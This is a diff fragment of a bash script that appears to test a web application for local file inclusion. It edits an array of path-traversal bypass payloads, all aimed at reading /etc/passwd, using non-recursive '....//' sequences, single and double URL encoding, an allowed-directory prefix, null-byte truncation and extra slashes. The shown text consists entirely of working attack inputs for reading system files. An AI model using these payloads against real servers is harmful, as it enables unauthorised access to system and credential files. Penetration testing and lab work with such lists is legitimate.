@@ -148,13 +148,13 @@ echo "=========================================="
 
 # Define bypass payloads
 declare -a BYPASS_TECHNIQUES=(
-    "non_recursive:....//....//....//....//etc/passwd"
+    "non_recursive:....//....//....//....//etc//passwd"
     "non_recursive_alt:..././..././..././..././etc/passwd"
     "non_recursive_backslash:....\/....\/....\/....\/etc/passwd"
-    "url_encoded:%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
-    "double_encoded:%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
+    "url_encoded:%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    "double_encoded:%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
     "approved_path:./languages/../../../../etc/passwd"
-    "approved_path_bypass:./languages/....//....//....//....//etc/passwd"
+    "approved_path_bypass:./languages/....//....//....//....//etc//passwd"
     "null_byte:../../../../etc/passwd%00"
     "approved_null:./languages/../../../../etc/passwd%00"
     "extra_slashes:..././..././..././..././etc/passwd"
